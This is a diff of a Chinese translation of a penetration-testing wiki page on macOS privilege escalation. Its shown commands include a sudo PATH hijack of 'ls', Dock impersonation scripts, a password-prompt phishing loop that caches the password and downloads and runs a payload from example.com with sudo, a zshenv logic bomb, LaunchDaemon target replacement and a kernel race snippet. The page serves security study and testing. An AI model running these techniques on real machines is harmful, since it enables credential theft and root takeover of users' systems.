@@ -1,10 +1,10 @@
-# macOS Privilege Escalation
+# macOS 权限提升
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## TCC Privilege Escalation
+## TCC 权限提升
 
-如果你是来查找 TCC privilege escalation 的，请前往：
+如果你来这里是为了查找 TCC 权限提升，请前往：
 
 
 {{#ref}}
@@ -13,20 +13,20 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-请注意，**大多数影响 Linux/Unix 的 privilege escalation 技巧也会影响 MacOS** 机器。因此请参阅：
+许多影响 Linux 或其他类 Unix 系统的权限提升技术同样适用于 macOS。请参阅：
 
 
 {{#ref}}
 ../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
 {{#endref}}
 
-## User Interaction
+## 用户交互
 
 ### Sudo Hijacking
 
-你可以在 [Linux Privilege Escalation 文章中找到原始的 Sudo Hijacking technique](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)。
+你可以在 [Linux Privilege Escalation 帖子中找到原始的 Sudo Hijacking 技术](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)。
 
-但是，macOS 在用户执行 **`sudo`** 时会**保留**用户的 **`PATH`**。这意味着，实现此攻击的另一种方式是**劫持其他二进制文件**，因为受害者在**运行 sudo 时**仍会执行这些文件：
+但是，macOS 在用户执行 **`sudo`** 时会**保留**用户的 **`PATH`**。这意味着，实现此攻击的另一种方式是 **hijack** 受害者在**运行 sudo 时**仍会执行的其他二进制文件：
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
 cat > /opt/homebrew/bin/ls <<'EOF'
@@ -41,20 +41,20 @@ chmod +x /opt/homebrew/bin/ls
 # victim
 sudo ls
 ```
-注意，使用 terminal 的用户极有可能已经安装了 **Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的 binaries。
+注意，使用 terminal 的用户极有可能已经**安装了 Homebrew**。因此，可以劫持 **`/opt/homebrew/bin`** 中的二进制文件。
 
-### Dock Impersonation
+### Dock 伪装
 
-通过一些 **social engineering**，你可以在 Dock 中 **impersonate 例如 Google Chrome**，并实际执行你自己的 script：
+通过一些**社会工程**，你可以在 Dock 中**伪装成例如 Google Chrome**，并实际执行自己的脚本：
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
 一些建议：
 
-- 检查 Dock 中是否有 Chrome；如果有，则**移除**该条目，并将**伪造的** **Chrome 条目添加到 Dock 数组中的相同位置**。
+- 检查 Dock 中是否有 Chrome；如果有，**移除**该条目，并将**伪造的** **Chrome 条目添加到 Dock 数组中的相同位置**。
 
 <details>
-<summary>Chrome Dock impersonation script</summary>
+<summary>Chrome Dock 伪装脚本</summary>
 ```bash
 #!/bin/sh
 
@@ -131,11 +131,11 @@ killall Dock
 {{#tab name="Finder Impersonation"}}
 一些建议：
 
-- 你**无法从 Dock 中移除 Finder**，因此如果要将其添加到 Dock，可以把伪造的 Finder 放在真实 Finder 旁边。为此，你需要**将伪造的 Finder 条目添加到 Dock 数组的开头**。
-- 另一个选项是不将其放入 Dock，而是直接打开它；“Finder 请求控制 Finder”并不奇怪。
-- 另一个**无需通过令人恐惧的弹窗请求密码即可提升为 root**的选项，是让 Finder 真正请求密码以执行特权操作：
-- 要求 Finder 将新的 **`sudo`** 文件复制到 **`/etc/pam.d`**（请求密码的提示会显示“Finder 想要复制 sudo”）
-- 要求 Finder 复制新的 **Authorization Plugin**（你可以控制文件名，这样请求密码的提示会显示“Finder 想要复制 Finder.bundle”）
+- 你**无法从 Dock 中移除 Finder**，因此如果要将其添加到 Dock，可以把伪造的 Finder 放在真实 Finder 的旁边。为此，你需要**将伪造的 Finder 条目添加到 Dock 数组的开头**。
+- 另一种选择是不将其放入 Dock，而是直接打开它；“Finder 请求控制 Finder”并不奇怪。
+- 另一种**无需询问密码即可提升到 root**、避免出现令人不适的对话框的方法，是让 Finder 真正请求密码来执行特权操作：
+- 让 Finder 将一个新的 **`sudo` 文件复制到 `/etc/pam.d`**（密码提示会显示“Finder 想要复制 sudo”）
+- 让 Finder 复制一个新的 **Authorization Plugin**（你可以控制文件名，这样密码提示会显示“Finder 想要复制 Finder.bundle”）
 
 <details>
 <summary>Finder Dock impersonation script</summary>
@@ -215,13 +215,13 @@ killall Dock
 
 ### Password prompt phishing + sudo reuse
 
-Malware 经常滥用用户交互来**捕获具备 sudo 权限的密码**，并以编程方式重复使用。常见流程：
+Malware 经常滥用用户交互来**捕获具备 sudo 权限的密码**，并通过程序重复使用该密码。常见流程如下：
 
 1. 使用 `whoami` 识别已登录用户。
 2. **循环显示密码提示**，直到 `dscl . -authonly "$user" "$pw"` 返回成功。
-3. 缓存凭据（例如 `/tmp/.pass`），并使用 `sudo -S` 执行特权操作（通过标准输入传递密码）。
+3. 缓存凭据（例如 `/tmp/.pass`），并通过 `sudo -S` 驱动特权操作（密码通过标准输入传递）。
 
-最小示例链：
+最简示例链：
 ```bash
 user=$(whoami)
 while true; do
@@ -232,13 +232,13 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-窃取到的密码随后可以通过 **使用 `xattr -c` 清除 Gatekeeper quarantine** 重新利用，用于复制 LaunchDaemons 或其他特权文件，并以非交互方式运行后续阶段。<sup>[[1]](#references)</sup>
+窃取的密码随后可被重新用于**通过 `xattr -c` 清除 Gatekeeper quarantine**、复制 LaunchDaemons 或其他特权文件，并以非交互方式运行额外阶段。<sup>[[1]](#references)</sup>
 
-## 较新的 macOS-specific vectors（2023–2025）
+## Newer macOS-specific vectors (2023–2026)
 
-### 已弃用的 `AuthorizationExecuteWithPrivileges` 仍可使用
+### Deprecated `AuthorizationExecuteWithPrivileges` still usable
 
-`AuthorizationExecuteWithPrivileges` 在 10.7 中已被弃用，但**在 Sonoma/Sequoia 上仍然有效**。许多商业更新器会使用不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标 binary 对用户可写，你就可以植入 trojan，并利用合法的 prompt：
+`AuthorizationExecuteWithPrivileges` 在 10.7 中已被弃用，但**在 Sonoma/Sequoia 上仍然可用**。许多商业更新程序会使用不受信任的路径调用 `/usr/libexec/security_authtrampoline`。如果目标二进制文件可由用户写入，你就可以植入 trojan，并利用合法的提示执行：
 ```bash
 # find vulnerable helper calls
 log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
@@ -253,9 +253,9 @@ chmod +x /Users/me/Library/Application\ Support/Target/helper
 
 ### Privileged helper / XPC triage
 
-许多现代第三方 macOS privescs 都遵循相同模式：一个 **root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露 **Mach/XPC service**，随后该 helper 要么**不验证客户端**，要么验证得**太晚**（PID race），要么暴露一个会处理**用户可控路径/脚本**的 **root method**。这类 bug 正是 VPN 客户端、游戏启动器和 updater 中许多近期 helper bugs 背后的原因。<sup>[[2]](#references)</sup>
+许多现代第三方 macOS privescs 都遵循相同模式：一个 **root LaunchDaemon** 从 **`/Library/PrivilegedHelperTools`** 暴露 **Mach/XPC service**，然后该 helper 要么**不验证客户端**，要么验证得**太晚**（PID race），要么暴露一个会处理**用户控制的路径/脚本**的 **root method**。这类 bug 导致了 VPN 客户端、游戏启动器和 updater 中近期出现的许多 helper 漏洞。<sup>[[2]](#references)</sup>
 
-快速 triage 清单：
+快速 triage 检查清单：
 ```bash
 ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
 plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
@@ -265,19 +265,19 @@ codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.ap
 strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
 done
 ```
-特别注意以下类型的 helpers：
+特别注意以下 helpers：
 
 - 在 **卸载后** 仍继续接受请求，因为该 job 仍加载在 `launchd` 中
-- 从 **`/Applications/...`** 或其他可由非 root 用户写入的路径执行脚本或读取配置
-- 依赖基于 **PID** 或仅基于 **bundle-id** 的 peer 验证，而这类验证可能存在竞态条件
+- 从 **`/Applications/...`** 或其他非 root 用户可写的路径执行 scripts 或读取 configuration
+- 依赖基于 **PID** 或仅基于 **bundle-id** 的 peer validation，而这些验证可能存在 race condition
 
-有关 helper authorization bugs 的更多详情，请查看 [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)。
+有关 helper authorization bugs 的更多详情，请查看[此页面](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)。
 
-### PackageKit 脚本环境继承（CVE-2024-27822）
+### PackageKit script environment inheritance (CVE-2024-27822)
 
-在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复此问题之前，通过 **`Installer.app`** / **`PackageKit.framework`** 由用户发起的安装可能会在当前用户的环境中以 root 身份执行 **PKG scripts**。这意味着，使用 **`#!/bin/zsh`** 的 package 会加载攻击者的 **`~/.zshenv`**，并在受害者安装该 package 时以 **root** 身份运行它。<sup>[[3]](#references)</sup>
+在 Apple 于 **Sonoma 14.5**、**Ventura 13.6.7** 和 **Monterey 12.7.5** 中修复该问题之前，通过 **`Installer.app`** / **`PackageKit.framework`** 由用户发起的安装可能会在当前用户的 environment 中以 root 身份执行 **PKG scripts**。这意味着，使用 **`#!/bin/zsh`** 的 package 会加载攻击者的 **`~/.zshenv`**，并在受害者安装该 package 时以 **root** 身份运行它。<sup>[[3]](#references)</sup>
 
-这作为一个 **logic bomb** 尤其值得关注：你只需要在用户账户中取得 foothold，并拥有一个可写的 shell startup file，然后等待用户执行任何存在漏洞的 **zsh-based** installer 即可。这通常不适用于 **MDM/Munki** deployments，因为它们运行在 root 用户的环境中。<sup>[[3]](#references)</sup>
+这作为 **logic bomb** 尤其值得关注：你只需要在用户账户中取得 foothold，并拥有一个可写的 shell startup file，然后等待用户执行任何存在漏洞的、基于 **zsh** 的 installer。该问题通常不适用于 **MDM/Munki** deployments，因为它们在 root 用户的 environment 中运行。<sup>[[3]](#references)</sup>
 ```bash
 # inspect a vendor pkg for shell-based install scripts
 pkgutil --expand-full Target.pkg /tmp/target-pkg
@@ -287,80 +287,107 @@ rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg
 # logic bomb example for vulnerable zsh-based installers
 echo 'id > /tmp/pkg-root' >> ~/.zshenv
 ```
-如果你想深入了解特定于 installer 的滥用方式，也请查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。
+如果想更深入了解特定于 installer 的滥用方式，也请查看[此页面](macos-files-folders-and-binaries/macos-installers-abuse.md)。
 
-### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
+### 通过 `.localized` 实现 installer 目标位置冲突
 
-如果 LaunchDaemon plist 或其 `ProgramArguments` 目标是**user-writable**，你可以通过替换它，然后强制 launchd 重新加载来提升权限：
+某些第三方 installer 会注册一个 root LaunchDaemon，其可执行文件通过 `/Applications/Target.app` 内的固定路径引用。如果攻击者能够先创建该 bundle，并使用**不同的 bundle identifier**，Installer 可能会保留这个诱饵 bundle，并将真实应用放置在 `/Applications/Target.localized/Target.app`。该 daemon 仍然指向原始路径。因此，诱饵 bundle 中由攻击者控制的可执行文件之后可以以 root 身份运行。<sup>[[8]](#references)</sup>
+
+重要的前置条件包括：<sup>[[8]](#references)</sup>
+
+1. 攻击者能够创建或控制预期的应用路径。
+2. package 不会删除冲突的 bundle。
+3. 特权 job 使用该 bundle 内的硬编码路径。
+4. 用户或 MDM workflow 安装 package 并注册该 job。
+
+查找被重新定位的 bundle，然后使用下一节中的 enumeration loop 检查 LaunchDaemon targets：<sup>[[8]](#references)</sup>
 ```bash
-sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
-cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
-chmod 755 /Library/PrivilegedHelperTools/securemonitor
-cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
-<plist version="1.0"><dict>
-<key>Label</key><string>com.apple.securemonitor</string>
-<key>ProgramArguments</key>
-<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
-<key>RunAtLoad</key><true/>
-</dict></plist>
-PLIST
-sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
+find /Applications -type d -name '*.localized' -prune -print
+for app in /Applications/*.app; do
+[ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
+done
 ```
-这与针对 **CVE-2025-24085** 发布的 exploit pattern 相似，在该漏洞中，攻击者滥用可写的 plist，以 root 身份执行攻击者代码。
+更安全的 installer 会解析最终 bundle 位置，并将特权 executables 保存在 root-owned 位置，例如 `/Library/PrivilegedHelperTools`。在注册或启动 job 之前，还应验证 ownership 和 code signing。<sup>[[8]](#references)</sup>
 
-### XNU SMR credential race (CVE-2025-24118)
+### Writable LaunchDaemon target hijack
 
-`kauth_cred_proc_update` 中的 **race** 允许本地攻击者通过在线程之间反复执行 `setgid()`/`getgid()` 循环，直到发生撕裂的 `memcpy`，从而破坏只读 credential pointer（`proc_ro.p_ucred`）。成功破坏后可获得 **uid 0** 和 kernel memory access。最小 PoC 结构：
+LaunchDaemon plist 可能由 root-owned，但其 `Program` 或第一个 `ProgramArguments` 条目却指向 user-writable directory。检查**整个路径**，而不只是 executable mode。如果父目录可写，attacker 可能重命名 root-owned executable，并在同一路径创建 replacement。下次 job 启动时，replacement 将以 root 身份运行。重启或正常的 service restart 即可触发。attacker 不需要权限在 system domain 中运行 `launchctl bootstrap`。<sup>[[7]](#references)</sup>
+
+首先枚举每个 target 及其直接父目录：<sup>[[7]](#references)</sup>
+```bash
+for p in /Library/LaunchDaemons/*.plist; do
+target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
+[ -n "$target" ] ||
+target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
+[ -n "$target" ] || continue
+printf '\n%s -> %s\n' "$p" "$target"
+ls -ld "$target" "$(dirname "$target")" 2>/dev/null
+done
+```
+当文件或其父目录可写时，保留原始 binary，并将该路径替换为可执行 payload。然后等待已加载的 daemon 重启。<sup>[[7]](#references)</sup>
+```bash
+target=/path/from/the/plist
+mv "$target" "$target.real"
+cp /tmp/payload "$target"
+chmod 755 "$target"
+```
+### XNU SMR credential-pointer race (CVE-2025-24118)
+
+易受攻击的 `kauth_cred_proc_update` 路径使用非原子的 `zalloc_ro_mut` API 更新 `proc_ro.p_ucred`，而 SMR readers 在未加锁的情况下加载该指针。公开的触发方式使用经过特殊准备的 setgid binary。一个线程在其 real 和 effective group IDs 之间切换，而另一个线程则反复进入诸如 `getgid()` 之类的 syscall。<sup>[[4]](#references)</sup>
 ```c
-// thread A
-while (1) setgid(rand());
-// thread B
-while (1) getgid();
+// Writer thread inside a setgid binary
+while (1) {
+setgid(real_gid);
+setgid(effective_gid);
+}
+// Reader thread
+while (1) observed_gid = getgid();
 ```
-结合 heap grooming，将受控数据放置到指针重新读取的位置。在易受攻击的构建版本中，这是一种可靠的 **local kernel privesc**，且不需要绕过 SIP。<sup>[[4]](#references)</sup>
+将其视为一种 **race primitive**，而不是现成的 root exploit。公开的 PoC 展示了 credential pointer 被撕裂的情况，通常会以 kernel panic 结束。研究人员仅在 Intel 上复现了该 corruption，并未实现对生成的 credential object 的确定性控制。Apple 在 macOS 15.3 中将该更新改为 atomic pointer exchange。<sup>[[4]](#references)</sup>
 
-### 通过 Migration assistant ("Migraine", CVE-2023-32369) 绕过 SIP
+### 通过 Migration Assistant 绕过 SIP（“Migraine”，CVE-2023-32369）
 
-即使已经获得 root，SIP 仍会阻止向系统位置写入数据。**Migraine** 漏洞滥用 Migration Assistant entitlement `com.apple.rootless.install.heritable`，生成一个继承 SIP bypass 的子进程，并覆盖受保护的路径（例如 `/System/Library/LaunchDaemons`）。<sup>[[5]](#references)</sup>攻击链如下：
+即使你已经拥有 root，SIP 仍会阻止对系统位置的写入。**Migraine** bug 滥用 Migration Assistant entitlement `com.apple.rootless.install.heritable`，生成一个继承 SIP bypass 的 child process，并覆盖受保护的路径（例如 `/System/Library/LaunchDaemons`）。<sup>[[5]](#references)</sup>攻击链如下：
 
-1. 在运行中的系统上获得 root。
-2. 使用构造的状态触发 `systemmigrationd`，使其运行攻击者控制的 binary。
-3. 利用继承的 entitlement 修改受 SIP 保护的文件，即使重启后仍可持久化。
+1. 在运行中的系统上获取 root。
+2. 使用 crafted state 触发 `systemmigrationd`，使其运行 attacker-controlled binary。
+3. 使用继承的 entitlement 修改受 SIP 保护的文件，即使重启后仍能保持 persistence。
 
 ### NSPredicate/XPC expression smuggling（CVE-2023-23530/23531 bug class）
 
-多个 Apple daemon 通过 XPC 接受 **NSPredicate** 对象，却只验证由攻击者控制的 `expressionType` 字段。通过构造一个可执行任意 selector 的 predicate，可以在 root/system XPC services（例如 `coreduetd`、`contextstored`）中实现 **code execution**。如果与初始的 app sandbox escape 结合使用，则可以在**不触发用户提示**的情况下实现 **privilege escalation**。查找那些会反序列化 predicates 且缺少 robust visitor 的 XPC endpoints。<sup>[[6]](#references)</sup>
+多个 Apple daemons 通过 XPC 接受 **NSPredicate** objects，却只验证由 attacker 控制的 `expressionType` field。通过构造一个可计算任意 selectors 的 predicate，你可以在 **root/system XPC services**（例如 `coreduetd`、`contextstored`）中实现 **code execution**。如果与 initial app sandbox escape 结合，还能在**无需用户提示**的情况下实现 **privilege escalation**。寻找会 deserialize predicates 且缺少 robust visitor 的 XPC endpoints。<sup>[[6]](#references)</sup>
 
 ## TCC - Root Privilege Escalation
 
-### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+### CVE-2020-9771 - mount_apfs TCC bypass 和 privilege escalation
 
-**任何用户**（即使是未授权用户）都可以使用 `-o noowners` 创建并挂载 Time Machine snapshot，随后访问该 snapshot 中的**所有文件**，绕过 live volume 上的 ownership checks。唯一需要的 privilege 是所使用的 application（例如 `Terminal`）拥有 **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）。
+**任何用户**（即使是 unprivileged user）都可以使用 `-o noowners` 创建并挂载 Time Machine snapshot，随后**访问该 snapshot 中的所有文件**，从而绕过 live volume 上的 ownership checks。唯一需要的 privilege 是所使用的 application（例如 `Terminal`）具有 **Full Disk Access**（`kTCCServiceSystemPolicyAllfiles`）。
 
-命令和完整说明请参阅 TCC bypasses 页面：
+commands 和完整说明位于 TCC bypasses 页面：
 
 {{#ref}}
 macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
 {{#endref}}
 
-## Sensitive Information
+## 敏感信息
 
-这可能有助于提升 privileges：
+以下内容可能有助于进行 privilege escalation：
 
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
 
+
+
 ## References
 
-- [1] [Pentest Partners - 2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
-- [2] [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
-- [3] [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
-- [4] [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
-- [5] [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
-- [6] [Trellix Advanced Research Center - A New Privilege Escalation Bug Class on macOS and iOS (CVE-2023-23530/23531)](https://www.trellix.com/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
-
+- [1] [Pentest Partners - 2025 年，Infostealer 之年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [2] [CVE-2024-30165：适用于 macOS 的 AWS Client VPN Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
+- [3] [CVE-2024-27822：macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
+- [4] [TRAVERTINE：CVE-2025-24118](https://jprx.io/cve-2025-24118/)
+- [5] [Microsoft “Migraine” SIP bypass（CVE-2023-32369）](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [6] [Trellix Advanced Research Center - macOS 和 iOS 上的一类新型 Privilege Escalation Bug（CVE-2023-23530/23531）](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
+- [7] [LaunchDaemon Hijacking：通过不安全的文件夹权限实现 privilege escalation 和 persistence](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
+- [8] [通过 .localized 目录实现 macOS LPE](https://theevilbit.github.io/posts/localized/)
 {{#include ../../banners/hacktricks-training.md}}
